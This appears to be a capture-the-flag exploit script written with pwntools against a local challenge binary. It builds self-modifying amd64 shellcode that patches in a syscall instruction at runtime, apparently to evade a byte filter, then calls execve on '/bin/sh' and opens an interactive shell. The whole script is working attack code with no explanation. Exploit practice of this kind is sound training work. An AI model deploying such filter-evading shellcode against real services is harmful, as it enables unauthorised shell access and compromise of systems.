from pwn import *

p=remote("0",43007)
#p=process("./shellcode")
context(log_level = "debug",arch = "amd64",os = "linux")

shellcode='''
add     rax,0x21
mov     byte ptr [rax], 0xf
add     rax,1
mov     byte ptr [rax], 0x5
xor 	rsi,	rsi			
push	rsi				
mov     rdi,rsp
add     rdi,0x29
mov 	rax,59			
cdq					

'''

#p=process("./format_level2")
payload=asm(shellcode)+b'/bin/sh'
attach(p)
p.sendafter("shellcode:",payload)

p.interactive()
